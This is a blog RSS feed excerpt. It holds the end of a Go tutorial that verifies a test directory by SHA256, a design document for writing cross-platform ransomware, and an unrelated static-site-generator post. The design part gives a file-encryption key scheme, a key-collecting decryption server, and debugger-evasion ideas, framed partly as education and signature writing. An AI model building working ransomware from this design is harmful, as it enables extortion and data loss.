<p>If you haven&rsquo;t seen a hashing function before, SHA256 is a cryptographic hash. Cryptographic hashes are meant to take an arbitrary amount of data and map it to a fixed space (e.g. 32 bytes). They are meant to be infeasible to reverse, meaning you should only be able to discover the input that results in a certain hash through brute force. Collisions, while possible, should be rare enough to not be considered. Other hashing algorithms, such as <a href="https://www.mscs.dal.ca/~selinger/md5collision/">MD5</a> and <a href="https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html">SHA1</a> can be manipulated to create collisions. This breaks the hash.</p>

<p>For our purposes, since SHA256 is consistent, the same input should hash to the same output, so we&rsquo;ll use the hashes of two files to see if they are equivalent. This will help check that we are doing things correctly when decrypting.</p>

<h4>Walking a directory</h4>

<p>Finally we get to take a walk down directory lane. This is also super easy because someone has already done the hard work. We don&rsquo;t have to screw around with handling file system edge cases or writing a tree traversal. The <code>filepath</code> package has a <a href="https://golang.org/pkg/path/filepath/#Walk"><code>Walk()</code></a> function. You provide it with a starting directory and a visitor function that you define. The visitor function gets called on each file or directory.</p>

<p>If you check the docs you&rsquo;ll see that the function that <code>Walk()</code> takes as its second argument is of the type <code>WalkFunc</code>. That definition is just below. What it is saying is that you need to pass in a function that matches the <code>WalkFunc</code> prototype.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">type</span> WalkFunc <span style="color:#66d9ef">func</span>(path <span style="color:#66d9ef">string</span>, info os.FileInfo, err <span style="color:#66d9ef">error</span>) <span style="color:#66d9ef">error</span>
</pre>
<p>In our case, this is <code>onVisit()</code>. In the docs you can check out the definition of the <code>os.FileInfo</code> interface, but the important bit is that it has an <code>IsDir()</code> function that returns true when the visitee (<code>path</code>) is a directory. When it is a directory we can ignore it and return early. On files, we&rsquo;ll print them out.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">// scratch/walk.go
</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> main

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;flag&#34;</span>
	<span style="color:#e6db74">&#34;log&#34;</span>
	<span style="color:#e6db74">&#34;path/filepath&#34;</span>
	<span style="color:#e6db74">&#34;os&#34;</span>
)

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">onVisit</span>(path <span style="color:#66d9ef">string</span>, fi os.FileInfo, err <span style="color:#66d9ef">error</span>) <span style="color:#66d9ef">error</span> {
	<span style="color:#66d9ef">if</span> fi.<span style="color:#a6e22e">IsDir</span>() {
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
	}
	
	log.<span style="color:#a6e22e">Println</span>(path)
	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	dir <span style="color:#f92672">:=</span> flag.<span style="color:#a6e22e">String</span>(<span style="color:#e6db74">&#34;dir&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;Directory to walk.&#34;</span>)
	flag.<span style="color:#a6e22e">Parse</span>()

	<span style="color:#66d9ef">if</span> len(<span style="color:#f92672">*</span>dir) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
		log.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;Please provide a -dir...&#34;</span>)
	}

	err <span style="color:#f92672">:=</span> filepath.<span style="color:#a6e22e">Walk</span>(<span style="color:#f92672">*</span>dir, onVisit)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Fatal</span>(err)
	}
}
</pre>
<p>Give it a run and see how it works. You can also remove the <code>IsDir()</code> check and see it print out the directories too. Fun.</p>

<h4>Putting it all together</h4>

<p>Back in <code>util/util.go</code> we&rsquo;ll update our <code>else if *verify</code> block in <code>main()</code> to contain the following. You&rsquo;ll also need to update your imports of import.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">		err <span style="color:#f92672">:=</span> filepath.<span style="color:#a6e22e">Walk</span>(<span style="color:#e6db74">&#34;_victim&#34;</span>, onVisit)
		<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
			log.<span style="color:#a6e22e">Fatal</span>(err)
		}
</pre>
<p>Then the party heads over to the <code>onVisit()</code> function. We read and take the hash of the original. Then we read and take the hash of the copy. Finally we check that they match.</p>

<p>It&rsquo;s all stuff we saw in the last section. We&rsquo;re being tricky with our paths, since we&rsquo;re walking <code>_victim/</code> and checking in on <code>victim/</code> we just need to drop the underscore off the front to get the corresponding file that we are verfiying. That&rsquo;s done with the subslice notation <code>[1:]</code>, going from the first character (the one after the zeroth) to the end.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">onVisit</span>(path <span style="color:#66d9ef">string</span>, fi os.FileInfo, err <span style="color:#66d9ef">error</span>) <span style="color:#66d9ef">error</span> {
	<span style="color:#66d9ef">if</span> fi.<span style="color:#a6e22e">IsDir</span>() {
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
	}

	<span style="color:#75715e">// Read original.
</span><span style="color:#75715e"></span>	bsOrig, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(path)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error reading&#34;</span>, path)
		log.<span style="color:#a6e22e">Println</span>(err)
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
	}

	hashOrig <span style="color:#f92672">:=</span> sha256.<span style="color:#a6e22e">Sum256</span>(bsOrig)

	<span style="color:#75715e">// Read copy.
</span><span style="color:#75715e"></span>	bsCopy, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(path[<span style="color:#ae81ff">1</span>:])
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error reading&#34;</span>, path[<span style="color:#ae81ff">1</span>:])
		log.<span style="color:#a6e22e">Println</span>(err)
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
	}

	hashCopy <span style="color:#f92672">:=</span> sha256.<span style="color:#a6e22e">Sum256</span>(bsCopy)

	<span style="color:#75715e">// Report mismatches.
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> hashOrig <span style="color:#f92672">!=</span> hashCopy {
		log.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Mismatch for&#34;</span>, path)
	}

	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
}
</pre>
<p>Give ol&rsquo; <code>util/util.go</code> a run with <code>-verify</code> now and see how it does. It probably won&rsquo;t be too interesting unless you go and edit a file in the clone directory. You can also try deleting a file and see how that gets handled. Afterall, we don&rsquo;t want our ransomware losing people&rsquo;s data all willy nilly.</p>

<h2>Conclusion</h2>

<p>We have a decent setup for restoring our <code>victim/</code> directory now, we can also check that the files line up between the original and the copy.</p>

<p>Up next in the series we&rsquo;ll get to generating our server keypair, and we&rsquo;ll write a couple scratch programs to understand how to use the encryption packages. That will set us up nicely to write the encryptor in Part 3.</p>

<p>Keep on hacking on!</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Mon, 09 Nov 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Design Doc - Ransomware in Golang Part 0</title>
      <link>https://tacix.at/posts/Design Doc - Ransomware in Golang Part 0.html</link>
      <description>Go ransomware design document...</description>
      <content:encoded><![CDATA[<p>We’re going to build some ransomware. This document covers the high level design and a few details to get us started. We’ll be using an asymmetric + symmetric encryption scheme for locking files. We’ll also build a server for handling decryption. All of this will be written in Go, so it will be cross platform. Our malware will show off Go’s great parallelization and networking capabilities. From there we’ll get into the technical details and start looking at anti-analysis tricks and signature writing. I’ll take you through everything step by step.</p>

<h2>Design</h2>

<h3>Encryptor</h3>

<p>The encryptor is the malware sample that gets dropped on the victim’s computer. It will use a common asymmetric + symmetric encryption scheme for encrypting files. It will walk directories, visiting each file. It will selectively target certain files based on mimetype, extension, or size.
Encryption Scheme</p>

<p>The server will have an asymmetric keypair (e.g. RSA). The server private key will be kept private on the server. The server public key will be embedded in the encryptor client. When the client runs it will generate a client keypair and encrypt the private key with the server’s public key. For each file, it will generate a random symmetric key (e.g. AES). That file key will be used to encrypt the file contents, then that key will be encrypted with the client’s public key and stored. We will also store the IV and number of padding bytes for each file.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">type</span> EncryptionInfo <span style="color:#66d9ef">struct</span> {
	Path    <span style="color:#66d9ef">string</span>
	Padding <span style="color:#66d9ef">uint8</span>
	Key     []<span style="color:#66d9ef">byte</span>
	Iv      []<span style="color:#66d9ef">byte</span>
} 
</pre>
<p>This allows the server to unlock a machine by decrypting the single client private key. That client key and be used to decrypt each file key, and each file key, in turn, can be used to decrypt its respective file.</p>

<h3>File Walking</h3>

<p>This will be incredibly simple. The Go package path/filepath includes a method Walk. We’ll implement the visitor function to handle each file. This is where we can add filtering to not target files that are too large or an unknown file type. For detecting file types we will either use mimetype or http.DetectContentType.
Server</p>

<p>The server will be a standard HTTP server in Golang. These are super easy to write. We’ll look at HTML templating for the front-end portion of the site. This will have a few support methods for the client.</p>

<p>While the client won’t always have a network connection, when it does we will upload the encrypted key to the server to save the user from having to. For this we’ll have some endpoint like /storeKey. The front-end will need an endpoint to trigger decryption, something like /decrypt, where it can post the user’s key file (or the simple code in place of the file) and get back the decryptor.</p>

<h2>Milestones</h2>

<h3>Environment</h3>

<p>This is where we will get set up. Right now I think it will just be installing Go, which is incredibly straight forward. You will also learn about the project layout and any other information that will be helpful pre-code.</p>

<h3>Victim directory setup</h3>

<p>I’ll be working on the computer I use daily as I’m sure many of you will too. Since we do not want to be encrypting our disks before we have written a decryptor, we’ll write a program to set up a victim directory. If the directory currently exists it will remove it, then it will copy in a directory structure we have established elsewhere on disk. We’ll be running our encryptor repeatedly while debugging it, this will allow an easy set up and tear down of the test directory.</p>

<h3>Key generator</h3>

<p>Following the <a href="https://medium.com/@tarcisioma/ransomware-encryption-techniques-696531d07bb9">standard ransomware encryption scheme</a>, we’ll need a master key pair for the server to use. We’ll dive more into encryption later, but the short of it is we will be using AES (symmetric) to encrypt the files, we’ll encrypt those keys with an asymmetric client keypair. The private key of the client keypair will be encrypted by the server keypair’s public key. In this milestone we will write a program that generates the server keypair, saves it to disk, and prints out the public key in a code-friendly format for our encryptor client.</p>

<h3>Encryptor</h3>

<p>We finally get to write our ransomware client! Here we’ll start with building blocks of the client, such as asymmetric and symmetric cryptography and walking a directory structure. Then we will combine these pieces into a simple but functional prototype that will get refined throughout the rest of the series.</p>

<h3>Server and key decryption</h3>

<p>The encryptor needs a server that takes payment (ours won’t, see: Not Covered) and returns a decrypted client key. Here we’ll learn about writing web servers in Go and HTML templating. Rather than running a separate application like Apache, we can get a webserver up and running with just Go code. We will then expand on this for better usability. For example, most users will not have the technical skills to find and upload the key file, so our encryptor client should do it for them when it has network connectivity.</p>

<h3>File decryption</h3>

<p>Since you have the encryptor written, this should be fairly straight forward. We just need to flip the encryption methods to be decryption methods using the same directory walking. Once this is done you’ll have an end-to-end functional prototype. Another usability improvement will be to patch the decrypted key into a pre-built decryptor. This way the user does not need to manage two separate files.</p>

<h3>Anti-analysis</h3>

<p>A lot of anti-analysis techniques are OS specific. Since we are building cross-platform malware there is a limit to what can be implemented. What is possible is process enumeration. Malware tends to check for known analysis programs (debuggers, network capturing tools, etc.) and can either decide to kill them, not run, or do something else entirely. We’ll explore a few of these options.</p>

<p>Another anti-analysis option we have in Go is to do timing checks. If the process is being stepped through in a debugger, the execution will be much slower than it normally would. We can capture a start time then an end time at some other point and check that the difference is within some threshold of our normal measurement.</p>

<h3>Parsing debug information</h3>

<p>Next we will take an analysis point of view and see how much information we can recover form our Go binary. We will explore the debug information and the executable file format (either ELF or PE) by reimplementing the work done in this awesome blog post. We’ll also explore ways to ruin these helpful debug hints.</p>

<h3>Signature coverage</h3>

<p>In this milestone we will take a defensive posture by writing ClamAV and YARA signatures for our ransomware. We will start by looking at hash based signatures and see why they suck. Next we’ll move onto real signature writing strategies, getting byte based coverage.</p>

<h2>Not Covered (yet)</h2>

<h3>Accepting payments</h3>

<p>Payments aren’t covered for 2 reasons. The first being I don’t want to provide some ready-to-go malware package for people to ruin their lives with. The other is that it is actually a pretty large topic that I’ll cover in the future when we set up a darknet e-commerce shop.</p>

<h3>OS specific techniques</h3>

<p>A lot of anti-analysis techniques are OS specific. We won’t be covering those here. We’ll work on some OS specific implants at a way later date. Right now we’re going to skip manually loading our libraries and injecting into other processes. This allows our malware to be cross platform, which is great since 2020 is the year of the Linux desktop.</p>

<h3>Opsec</h3>

<p>Opsec is antithetical to operational efficiency. We’d spend much more time on protecting our anonymity than writing this ransomware. We don’t need to spend $50 dollars on a burner, worry about buying our hosting services with untraceable Bitcoin, or figure out how to bootstrap an email account over Tor so you can purchase a VPN. I’ve written about some orthogonal topics it in the past and it’s not easy.</p>

<h3>Infection</h3>

<p>My dad got infected with Sigma ransomware from a response to his Craigslist casual encounters post (jk, it was a job ad). Word documents with macros are a common infection vector. In the same spirit of not providing a fully weaponized system, that will not be covered in this series.</p>

<h2>Conclusion</h2>

<p>This should be really fun. I’ve had fun prototyping it and you’ll have a blast and learn a lot running through it. I also have a ton of great topics planned once we’re done.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Fri, 06 Nov 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Writing my own static site generator</title>
      <link>https://tacix.at/posts/Writing my own static site generator.html</link>
      <description>Writing a simple static site generate in Golang to avoid learning Jekyll...</description>
      <content:encoded><![CDATA[<p>Hey, first post! I wanted to set up a blog to track the things that I work on. I figured you can&rsquo;t beat free, so I set up GitHub Pages. Jekyll is the default for Pages, so I dove in to check it out. I could not really figure out a minimal example. Do I just clone in an entire theme to my repo and start working from there? What are all these directories? I need to install Ruby? Figured I could write one in ~100 lines of code, so I set off.</p>

<h2>Golang</h2>

<p>I ended up clocking in about ~150 lines for my main file, which I thought would be the heart of the code. The main idea is loop over some markdown posts, md -&gt; html using <a href="https://github.com/russross/blackfriday">Blackfriday</a>, then generate the index from the posts.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	id <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span>IndexData{
		Posts: []PostData{},
	}

	<span style="color:#a6e22e">genPosts</span>(id)

	<span style="color:#a6e22e">writeTemplate</span>(
		[]<span style="color:#66d9ef">string</span>{
			<span style="color:#e6db74">&#34;_templates/index.gohtml&#34;</span>,
			<span style="color:#e6db74">&#34;_templates/base.gohtml&#34;</span>,
		}, <span style="color:#e6db74">&#34;index.html&#34;</span>, id)

	<span style="color:#a6e22e">genAbout</span>()
}
</pre>
<p>Since the heart of things is the <code>genPosts</code> function, we&rsquo;ll look at that. The first block is listing out the markdown files in the <code>_posts</code> folder. Then we kick it off looping over those and generating an HTML file for each.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">files, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadDir</span>(<span style="color:#e6db74">&#34;_posts&#34;</span>)
<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
	log.<span style="color:#a6e22e">Fatal</span>(err)
}

<span style="color:#66d9ef">for</span> _, f <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> files {
	<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>}
</pre>
<p>In our for loop, the first step is reading the file in, which is pretty straight forward Go code.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	md, err <span style="color:#f92672">:=</span> ioutil.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">&#34;_posts/&#34;</span> <span style="color:#f92672">+</span> f.<span style="color:#a6e22e">Name</span>())
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Println</span>(err)
		<span style="color:#66d9ef">continue</span>
	}
</pre>
<p>Now I jumped right into rendering the markdown using Blackfriday and I kept getting awful parser errors. I was seriously wondering how such a buggy repo could have so many stars! It was user error though. I&rsquo;m on a Windows host, and the <code>\r\n</code> is apparently not handled by Blackfriday! This was the most time consuming thing of the project. That gives us this beautiful function which is just a <code>bytes.Replace()</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	md = <span style="color:#a6e22e">windowsBad</span>(md)
</pre>
<p>In my review of SSGs I noticed they all had some metadata at the top of the file. This is called <em>Front Matter</em>. It seemed simple enough, you have some JSON, YAML, or TOML followed by a delimeter. I chose TOML since I had never used it before. I have a strange affinity for JSON but it is kinda a pain to write. I chose the delimiter <code>---</code>.</p>

<p>Simply split on that, grab the chunk before and treat it as TOML, rejoin the chunk after and treat it as markdown.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	s <span style="color:#f92672">:=</span> bytes.<span style="color:#a6e22e">Split</span>(md, []byte(<span style="color:#e6db74">&#34;\n---\n&#34;</span>))
	<span style="color:#66d9ef">if</span> len(s) &lt; <span style="color:#ae81ff">2</span> {
		log.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Missing post metadata.&#34;</span>)
		<span style="color:#66d9ef">continue</span>
	}
	md = bytes.<span style="color:#a6e22e">Join</span>(s[<span style="color:#ae81ff">1</span>:], []byte(<span style="color:#e6db74">&#34;\n---\n&#34;</span>))

	<span style="color:#66d9ef">var</span> pd PostData
	_, err = toml.<span style="color:#a6e22e">Decode</span>(string(s[<span style="color:#ae81ff">0</span>]), <span style="color:#f92672">&amp;</span>pd)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		log.<span style="color:#a6e22e">Println</span>(err)
		<span style="color:#66d9ef">continue</span>
	}
</pre>
<p>The TOML reads right into the <code>PostData</code> struct. We have a post title and a date. The tags aren&rsquo;t used right now, but it should be easy enough to whip up some JS for filtering, or individual pages for each tag. The field <code>Raw</code> is where the markdown rendered to HTML goes.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">type</span> PostData <span style="color:#66d9ef">struct</span> {
	Title <span style="color:#66d9ef">string</span>
	Tags  []<span style="color:#66d9ef">string</span>
	Date  time.Time
	Raw   template.HTML
}
</pre>
<p>After that we render and pass <code>PostData</code> to our templates. Then we append the post to the <code>IndexData</code> structure we passed in so we can go back and write out the index.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">	cr <span style="color:#f92672">:=</span> <span style="color:#a6e22e">NewChromaRenderer</span>(
		<span style="color:#a6e22e">ChromaOptions</span>(html.<span style="color:#a6e22e">TabWidth</span>(<span style="color:#ae81ff">4</span>)))
	pd.Raw = template.<span style="color:#a6e22e">HTML</span>(blackfriday.<span style="color:#a6e22e">Run</span>(
		md, blackfriday.<span style="color:#a6e22e">WithRenderer</span>(cr)))
	<span style="color:#a6e22e">writeTemplate</span>(
		[]<span style="color:#66d9ef">string</span>{
			<span style="color:#e6db74">&#34;_templates/post.gohtml&#34;</span>,
			<span style="color:#e6db74">&#34;_templates/base.gohtml&#34;</span>,
		}, fmt.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;posts/%s.html&#34;</span>, pd.Title), pd)
	id.Posts = append(id.Posts, pd)
</pre>
<p>The function <code>writeTemplate</code> is just a convenience wrapper I made for executing templates then writing them to a file. Now that I&rsquo;m writing this I see I should probably check the error that it returns.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">writeTemplate</span>(t []<span style="color:#66d9ef">string</span>, o <span style="color:#66d9ef">string</span>, d <span style="color:#66d9ef">interface</span>{}) <span style="color:#66d9ef">error</span> {
	it, err <span style="color:#f92672">:=</span> template.<span style="color:#a6e22e">ParseFiles</span>(t<span style="color:#f92672">...</span>)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		<span style="color:#66d9ef">return</span> err
	}

	f, err <span style="color:#f92672">:=</span> os.<span style="color:#a6e22e">Create</span>(o)
	<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		<span style="color:#66d9ef">return</span> err
	}
	<span style="color:#66d9ef">defer</span> f.<span style="color:#a6e22e">Close</span>()

	<span style="color:#66d9ef">return</span> it.<span style="color:#a6e22e">ExecuteTemplate</span>(f, <span style="color:#e6db74">&#34;base.gohtml&#34;</span>, d)
}
</pre>
<p>I skipped over the <code>NewChromaRenderer</code> above. There is a really nice library called <a href="https://github.com/Depado/bfchroma">bfchroma</a> that adds syntax highlighting support to Blackfriday (amazing!). It doesn&rsquo;t load though.</p>

<p>Blackfriday got cute with their packaging and are hosting it on <code>gopkg.in</code>. I had not really seen this before, but it seems like it knocked a lot of things out of sync. Some places are importing <code>github.com/russross/blackfriday/v2</code>. The repo tells you to <code>go get gopkg.in/russross/blackfriday.v2</code> though, and import that same URL. When installing bfchroma you can an error that it can&rsquo;t find that <code>github.com</code> URL.</p>

<p>I tried forking the repo and swapping out all the URLs for the <code>gopkg.in</code> one, but something with the module wanted to store it there but import from <code>github.com</code>. It was a mess, I don&rsquo;t know if it was on my end or the packages&rsquo;. I just ended up grabbing the one file from <code>bfchroma</code>, doing some small modifications, and hosting it in this repo.</p>

<h2>Templates</h2>

<p>I learned a bit in this project, one of the things I had never touched before was nesting Go templates. I created a base template for the whole site, then define a few sub templates that get jammed in there. The following is out of <code>base.gohtml</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;<span style="color:#f92672">body</span>&gt;
  &lt;<span style="color:#f92672">header</span>&gt;
    &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">title</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">/</span>&gt;TACIX.AT&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
    &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">about</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">/about</span>&gt;About&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
  &lt;/<span style="color:#f92672">header</span>&gt;

  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">main</span>&gt;
  <span style="color:#75715e">{{</span> <span style="color:#66d9ef">template</span> <span style="color:#e6db74">&#34;main&#34;</span> <span style="color:#a6e22e">.</span> <span style="color:#75715e">}}</span>
  &lt;/<span style="color:#f92672">div</span>&gt;

  &lt;<span style="color:#f92672">footer</span>&gt;
  &lt;/<span style="color:#f92672">footer</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;
</pre>
<p>Then in the specific template, e.g. <code>index.gohtml</code> we can just define <code>main</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#75715e">{{</span> define <span style="color:#e6db74">&#34;main&#34;</span> <span style="color:#75715e">}}</span>
  <span style="color:#75715e">{{</span> <span style="color:#66d9ef">range</span> $p <span style="color:#f92672">:=</span> <span style="color:#a6e22e">.Posts</span> <span style="color:#75715e">}}</span>
    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">entry</span>&gt;
      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">date</span>&gt;<span style="color:#75715e">{{</span> $p<span style="color:#a6e22e">.Datef</span> <span style="color:#75715e">}}</span>&lt;/<span style="color:#f92672">div</span>&gt;
      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">post</span>&gt;
      	&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/posts/</span><span style="color:#75715e">{{</span> $p<span style="color:#a6e22e">.Title</span> <span style="color:#75715e">}}</span><span style="color:#e6db74">.html&#34;</span>&gt;<span style="color:#75715e">{{</span> $p<span style="color:#a6e22e">.Title</span> <span style="color:#75715e">}}</span>&lt;/<span style="color:#f92672">a</span>&gt;
      &lt;/<span style="color:#f92672">div</span>&gt;
    &lt;/<span style="color:#f92672">div</span>&gt;
  <span style="color:#75715e">{{</span> <span style="color:#66d9ef">end</span> <span style="color:#75715e">}}</span>
<span style="color:#75715e">{{</span> <span style="color:#66d9ef">end</span> <span style="color:#75715e">}}</span>
</pre>
<p>The <code>writeTemplate</code> function above handles loading multiple templates and then executing from <code>base.gohtml</code>. Neat! I also have one for injecting CSS. In the future when I make some more interactive blogs I will add one for JavaScript.</p>

<h2>Conclusion</h2>

<p>This took me about a day of programming with a nice break in the middle to take the dog to the dog park with the girlfriend and see the bats in Austin. I really feel setting up a standard static site generator would have taken as long. The base code is easy enough, the big time sink was styling the blog! I think that is the win with existing SSGs, having prebuilt themes. I shouldn&rsquo;t lie to myself though, I would have definitely taken as long tweaking a prebuilt theme as I did doing my own.</p>

<p>I do like doing things this way. This gives me a base to build future projects off of. I have a static site generator now that I fully understand and can easily add features to. A thought that came to mind with this, it would be pretty easy to take this tech and make a technical-focused markdown-based blogging site. Now if I ever want to build that up, I have a great starting point.</p>

<p>All the <a href="https://github.com/TACIXAT/tacixat.github.io">code</a> is public so feel free to take a look! The Go code is in <code>_sssg</code> (the extra <code>s</code> was for <em>simple</em>).</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Mon, 18 May 2020 13:37:00 -0400</pubDate>
    </item>
  </channel>
</rss>